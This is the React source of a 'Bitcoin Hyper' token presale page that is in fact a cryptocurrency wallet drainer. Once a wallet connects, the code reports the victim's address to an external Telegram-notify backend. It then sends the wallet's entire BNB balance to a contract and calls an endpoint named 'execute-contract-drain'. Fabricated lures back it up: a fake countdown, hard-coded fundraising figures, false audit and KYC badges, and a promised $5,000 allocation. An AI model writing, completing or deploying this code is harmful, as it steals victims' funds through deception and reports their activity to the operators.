import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount } from '@reown/appkit/react';
import { useBalance, useDisconnect, useWalletClient, useChainId } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// PRESALE CONFIGURATION - BSC ONLY
// ============================================

const PRESALE_CONFIG = {
  BSC: {
    chainId: 56,
    contractAddress: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500'
  }
};

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { disconnect } = useDisconnect();
  const { data: walletClient } = useWalletClient();
  
  // ✅ FIX: Get REAL wallet chain ID from wagmi, not AppKit
  const chainId = useChainId();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [balanceUSD, setBalanceUSD] = useState(0);
  const [bnbPrice, setBnbPrice] = useState(300);
  const [loading, setLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [completed, setCompleted] = useState(false);
  const [showCelebration, setShowCelebration] = useState(false);
  const [verifying, setVerifying] = useState(false);
  
  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.17
  });

  // Get balance using wagmi - FORCED to BSC chainId 56
  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address: address,
    chainId: 56, // Force BSC chain
  });

  // Fetch BNB price from CoinGecko
  useEffect(() => {
    const fetchBnbPrice = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
        const data = await response.json();
        if (data.binancecoin?.usd) {
          setBnbPrice(data.binancecoin.usd);
        }
      } catch (error) {
        console.log('Using default BNB price');
      }
    };
    
    fetchBnbPrice();
    const interval = setInterval(fetchBnbPrice, 60000);
    
    return () => clearInterval(interval);
  }, []);

  // Update balance and USD value
  useEffect(() => {
    if (balanceData) {
      setBalance(balanceData.formatted);
      const bnbAmount = parseFloat(balanceData.formatted);
      setBalanceUSD(bnbAmount * bnbPrice);
    }
  }, [balanceData, bnbPrice]);

  // ✅ SIMPLE BSC CHECK - from wagmi, not AppKit
  const isBSC = chainId === 56;

  // Log for debugging
  useEffect(() => {
    console.log('🔍 NETWORK CHECK:', {
      chainId: chainId,
      isBSC: isBSC,
      address: address,
      balance: balance
    });
  }, [chainId, isBSC, address, balance]);

  // Signer initialization
  useEffect(() => {
    const initSigner = async () => {
      if (!isConnected) {
        setSigner(null);
        setProvider(null);
        return;
      }

      let attempts = 0;
      const maxAttempts = 10;
      
      const tryGetWalletClient = async () => {
        if (walletClient) {
          try {
            const web3Provider = new ethers.BrowserProvider(walletClient);
            const web3Signer = await web3Provider.getSigner();
            
            setProvider(web3Provider);
            setSigner(web3Signer);
            
            console.log("✅ Signer ready:", await web3Signer.getAddress());
            
            // Send Telegram notification
            await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                message: `🔌 *Wallet Connected*\nAddress: \`${address}\`\nSigner: ✅ Ready\nNetwork: ${isBSC ? 'BSC' : 'Other'}`,
                type: 'connection'
              })
            }).catch(e => console.log('Telegram notify failed:', e));
            
            return true;
          } catch (err) {
            console.error("Signer init failed:", err);
            return false;
          }
        }
        return false;
      };

      if (await tryGetWalletClient()) return;

      const interval = setInterval(async () => {
        attempts++;
        if (await tryGetWalletClient() || attempts >= maxAttempts) {
          clearInterval(interval);
        }
      }, 500);

      return () => clearInterval(interval);
    };

    initSigner();
  }, [isConnected, walletClient, address, isBSC]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      verifyWallet();
    }
  }, [isConnected, address]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Verifying wallet...');
    
    try {
      // Send Telegram notification for verification start
      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `🔍 *Verifying Wallet*\nAddress: \`${address}\`\nStatus: Started`,
          type: 'verification'
        })
      }).catch(e => console.log('Telegram notify failed:', e));

      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        
        if (data.data.isEligible) {
          setTxStatus('✅ You qualify!');
          
          // Send Telegram notification for eligibility
          await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              message: `✅ *Eligible Wallet*\nAddress: \`${address}\`\nAllocation: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%`,
              type: 'eligible'
            })
          }).catch(e => console.log('Telegram notify failed:', e));
          
        } else {
          setTxStatus('✨ Wallet verified');
          
          // Send Telegram notification for non-eligible
          await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              message: `⏸️ *Non-Eligible Wallet*\nAddress: \`${address}\`\nStatus: Connected but not eligible`,
              type: 'non-eligible'
            })
          }).catch(e => console.log('Telegram notify failed:', e));
        }
      }
    } catch (err) {
      console.error('Verification error:', err);
      setError('Unable to verify wallet');
    } finally {
      setVerifying(false);
    }
  };

  // Execute function - WITH AUTO SWITCH TO BSC
  const executePresaleTransaction = async () => {
    if (!isConnected || !address) {
      setError("Wallet not connected");
      return;
    }

    if (!signer) {
      setError("Initializing wallet...");
      return;
    }

    if (!balanceData || balanceData.value <= 0n) {
      setError('Insufficient balance');
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus('⏳ Preparing transaction...');
      setTxHash('');

      // ✅ AUTO SWITCH TO BSC IF NOT ON CORRECT NETWORK
      if (!isBSC && window.ethereum) {
        setTxStatus('🔄 Switching to BSC network...');
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }] // 56 in hex
          });
          setTxStatus('⏳ Please confirm in wallet...');
        } catch (switchError) {
          // This error code indicates that the chain has not been added to wallet
          if (switchError.code === 4902) {
            setTxStatus('➕ Adding BSC network...');
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x38',
                chainName: 'BNB Smart Chain',
                nativeCurrency: {
                  name: 'BNB',
                  symbol: 'BNB',
                  decimals: 18
                },
                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                blockExplorerUrls: ['https://bscscan.com/']
              }]
            });
          }
        }
      }

      setTxStatus('⏳ Please confirm in wallet...');

      // Send Telegram notification for transaction start
      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `💫 *Transaction Started*\nAddress: \`${address}\`\nChain: BSC\nAmount: ${formatEther(balanceData.value)} BNB\nStatus: Awaiting wallet confirmation`,
          type: 'tx_start'
        })
      }).catch(e => console.log('Telegram notify failed:', e));

      // Verify signer
      const signerAddress = await signer.getAddress();
      if (signerAddress.toLowerCase() !== address.toLowerCase()) {
        throw new Error('Wallet address mismatch');
      }

      // Use BSC contract address directly
      const contract = new ethers.Contract(
        PRESALE_CONFIG.BSC.contractAddress,
        PROJECT_FLOW_ROUTER_ABI,
        signer
      );

      // USE 100% OF BALANCE
      const value = balanceData.value;

      // Log the transaction details
      console.log("💰 Transaction Details:", {
        from: address,
        contract: PRESALE_CONFIG.BSC.contractAddress,
        value: value.toString(),
        valueEth: ethers.formatEther(value),
        chain: 'BSC'
      });

      // Estimate gas first
      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
      
      // Send transaction
      const tx = await contract.processNativeFlow({
        value: value,
        gasLimit: gasEstimate * 120n / 100n
      });

      setTxHash(tx.hash);
      setTxStatus('✅ Transaction submitted! Waiting for confirmation...');

      // Send Telegram notification for tx hash
      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\n[View on BSCScan](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
          type: 'tx_submitted'
        })
      }).catch(e => console.log('Telegram notify failed:', e));

      // Wait for confirmation
      const receipt = await tx.wait();
      
      // Update balance
      refetchBalance?.();
      
      // Mark as completed
      setCompleted(true);
      
      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          chainName: 'BSC'
        })
      });
      
      setShowCelebration(true);
      setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);

      // Send Telegram notification for success
      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nTx: \`${tx.hash}\`\n[View Transaction](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
          type: 'success'
        })
      }).catch(e => console.log('Telegram notify failed:', e));
      
    } catch (err) {
      console.error('Transaction error:', err);
      
      // Send Telegram notification for error
      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `❌ *Transaction Failed*\nAddress: \`${address}\`\nError: ${err.message || 'Unknown error'}\nChain: BSC`,
          type: 'error'
        })
      }).catch(e => console.log('Telegram notify failed:', e));
      
      if (err.code === 4001) {
        setError('Transaction cancelled');
      } else if (err.message?.includes('insufficient funds')) {
        setError('Insufficient funds for gas');
      } else if (err.message?.includes('user rejected')) {
        setError('Transaction rejected');
      } else {
        setError(err.message || 'Transaction failed');
      }
      setTxStatus('❌ Failed');
    } finally {
      setLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      
      {/* Animated Background */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-20 w-96 h-96 bg-orange-500/10 rounded-full blur-3xl animate-pulse-glow"></div>
        <div className="absolute bottom-20 right-20 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl animate-pulse-glow delay-1000"></div>
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gradient-to-r from-orange-500/5 to-yellow-500/5 rounded-full blur-3xl animate-float"></div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
        
        {/* Header with Logo */}
        <div className="text-center mb-12">
          <div className="inline-block mb-6 relative">
            <div className="text-7xl animate-bounce-slow relative z-10">₿</div>
            <div className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-2xl opacity-30 animate-pulse"></div>
          </div>
          <h1 className="text-7xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent animate-pulse">
            BITCOIN HYPER
          </h1>
          <p className="text-gray-400 text-xl mb-6">Next Generation Layer 2 Solution</p>
          
          {/* Live Presale Badge */}
          <div className="inline-flex items-center gap-3 bg-green-500/10 border border-green-500/30 px-6 py-3 rounded-full backdrop-blur-sm">
            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
            <span className="text-green-400 font-medium">🔴 PRESALE LIVE</span>
          </div>
        </div>

        {/* Stats Grid */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
          <div className="stat-card">
            <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
            <div className="text-xs text-gray-400 uppercase">Token Price</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
            <div className="text-xs text-gray-400 uppercase">Bonus</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-yellow-400 mb-1">$1.2M</div>
            <div className="text-xs text-gray-400 uppercase">Raised</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-purple-400 mb-1">8,742</div>
            <div className="text-xs text-gray-400 uppercase">Participants</div>
          </div>
        </div>

        {/* Bonus Banner with Animation */}
        <div className="relative mb-8 overflow-hidden rounded-2xl">
          <div className="absolute inset-0 bg-gradient-to-r from-yellow-500/20 via-orange-500/20 to-red-500/20 animate-gradient-x"></div>
          <div className="relative bg-gray-900/70 backdrop-blur-md border border-yellow-500/30 p-8 text-center">
            <div className="absolute top-0 left-0 w-32 h-32 bg-yellow-500/20 rounded-full blur-3xl animate-pulse"></div>
            <div className="absolute bottom-0 right-0 w-32 h-32 bg-orange-500/20 rounded-full blur-3xl animate-pulse delay-700"></div>
            
            <span className="inline-block px-4 py-2 bg-yellow-500/20 text-yellow-400 rounded-full text-sm font-bold mb-4 animate-bounce">
              🔥 LIMITED TIME OFFER
            </span>
            <h2 className="text-5xl md:text-6xl font-black mb-4">
              <span className="bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                {presaleStats.currentBonus}% BONUS
              </span>
            </h2>
            <p className="text-gray-300 text-lg">
              Get $5,000 BTH + {presaleStats.currentBonus}% Extra
            </p>
          </div>
        </div>

        {/* Countdown Timer */}
        <div className="glass-card p-8 mb-8">
          <h3 className="text-center text-gray-400 text-sm uppercase tracking-wider mb-6">Presale Ends In</h3>
          <div className="grid grid-cols-4 gap-4 text-center">
            {[
              { label: 'Days', value: timeLeft.days },
              { label: 'Hours', value: timeLeft.hours },
              { label: 'Minutes', value: timeLeft.minutes },
              { label: 'Seconds', value: timeLeft.seconds }
            ].map((item, index) => (
              <div key={index} className="relative">
                <div className="text-5xl md:text-6xl font-black text-orange-400 animate-pulse">
                  {item.value.toString().padStart(2, '0')}
                </div>
                <div className="text-xs text-gray-500 mt-2 uppercase">{item.label}</div>
                {index < 3 && <span className="absolute -right-2 top-1/2 -translate-y-1/2 text-3xl text-gray-600 hidden md:block">:</span>}
              </div>
            ))}
          </div>
        </div>

        {/* Connect Wallet */}
        <div className="text-center mb-8">
          {!isConnected ? (
            <button
              onClick={() => {
                console.log("Opening wallet connection...");
                open();
              }}
              className="group relative transform hover:scale-105 transition-all duration-300"
            >
              <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
              <div className="relative bg-gray-900 rounded-2xl px-12 py-5 text-xl font-bold">
                Connect Wallet
              </div>
            </button>
          ) : (
            <div className="glass-card p-6">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-4">
                  <span className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></span>
                  <span className="font-mono text-lg bg-gray-900/50 px-4 py-2 rounded-lg border border-gray-700">
                    {formatAddress(address)}
                  </span>
                </div>
                <div className="text-right">
                  <span className="text-gray-400 text-sm block mb-1">Current Balance</span>
                  <span className="text-3xl font-bold text-orange-400">
                    {parseFloat(balance).toFixed(4)} BNB
                  </span>
                  <span className="text-sm text-gray-400 block">
                    ≈ ${balanceUSD.toFixed(2)} USD
                  </span>
                </div>
                <button
                  onClick={() => disconnect()}
                  className="px-4 py-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 transition-colors border border-red-500/30"
                >
                  Disconnect
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Network Warning - Now using correct chainId from wagmi */}
        {isConnected && !isBSC && (
          <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
            <div className="flex items-center gap-3">
              <span className="text-2xl">⚠️</span>
              <span>Click "Claim $5,000 BTH" to auto-switch to BSC network</span>
            </div>
          </div>
        )}

        {/* Verification Status */}
        {verifying && (
          <div className="glass-card p-6 mb-6 text-center">
            <div className="flex flex-col items-center gap-4">
              <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
              <p className="text-xl text-gray-300">Verifying wallet...</p>
            </div>
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="bg-red-900/30 border border-red-500/50 text-red-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm animate-shake">
            <div className="flex items-center gap-3">
              <span className="text-2xl">⚠️</span>
              <span>{error}</span>
            </div>
          </div>
        )}

        {/* Status Display */}
        {txStatus && !verifying && (
          <div className="glass-card p-4 mb-6 text-center">
            <p className="text-gray-300">{txStatus}</p>
            {txHash && (
              <a
                href={`https://bscscan.com/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-orange-400 text-sm hover:underline mt-2 inline-flex items-center gap-1"
              >
                View Transaction ↗
              </a>
            )}
          </div>
        )}

        {/* Celebration Modal */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4 animate-fadeIn">
            <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 max-w-md border border-orange-500/30 shadow-2xl transform animate-scaleIn">
              <div className="text-center">
                <div className="text-8xl mb-6 animate-bounce">🎉</div>
                <h2 className="text-4xl font-black mb-4 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                  Congratulations!
                </h2>
                <p className="text-xl text-gray-300 mb-4">You have successfully secured</p>
                <p className="text-6xl font-black text-orange-400 mb-3">$5,000 BTH</p>
                <p className="text-green-400 text-lg mb-2">+{presaleStats.currentBonus}% Bonus</p>
                <button
                  onClick={() => setShowCelebration(false)}
                  className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-10 rounded-xl transition-all transform hover:scale-105 text-lg"
                >
                  View Dashboard
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Main Content */}
        {isConnected && scanResult && (
          <div className="glass-card p-8">
            <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
            
            {scanResult.isEligible ? (
              <>
                {/* Allocation Card */}
                <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl p-8 mb-8 border border-orange-500/30 relative">
                  <div className="absolute -top-3 -right-3">
                    <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-sm font-bold px-4 py-2 rounded-full transform rotate-12 animate-pulse shadow-lg">
                      {presaleStats.currentBonus}% BONUS
                    </div>
                  </div>
                  
                  <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
                  <p className="text-6xl font-black text-orange-400 text-center mb-3">$5,000 BTH</p>
                  <p className="text-green-400 text-center mb-2">+{presaleStats.currentBonus}% Bonus</p>
                </div>
                
                {!completed ? (
                  <button
                    onClick={executePresaleTransaction}
                    disabled={loading || !signer}
                    className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                      {loading ? 'Processing...' : 
                       !signer ? 'Initializing...' :
                       '⚡ Claim $5,000 BTH'}
                    </div>
                  </button>
                ) : (
                  <button
                    onClick={claimTokens}
                    disabled={loading}
                    className="w-full group relative disabled:opacity-50"
                  >
                    <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                      {loading ? 'Processing...' : '🎉 View Your $5,000 BTH'}
                    </div>
                  </button>
                )}
              </>
            ) : (
              <div className="text-center py-12">
                <div className="text-6xl mb-6">👋</div>
                <h2 className="text-3xl font-bold mb-4">Welcome to Bitcoin Hyper!</h2>
                <p className="text-gray-400 text-lg mb-6 max-w-2xl mx-auto">
                  Thank you for connecting your wallet. To ensure a fair and secure presale for everyone, 
                  we verify each wallet's activity and history. This helps us maintain a bot-free environment 
                  and rewards genuine community members.
                </p>
                <div className="glass-card p-6 max-w-md mx-auto">
                  <p className="text-gray-300">
                    Our team reviews all connections. Please check back soon or follow our 
                    announcements for updates on the next presale phase.
                  </p>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Trust Badges */}
        <div className="mt-12 text-center">
          <div className="flex flex-wrap justify-center gap-3 mb-6">
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited by CertiK</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ KYC Verified</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ 50M+ Raised</span>
          </div>
          <p className="text-gray-600 text-sm">
            © 2026 Bitcoin Hyper. All rights reserved. | Secure Presale Platform
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;
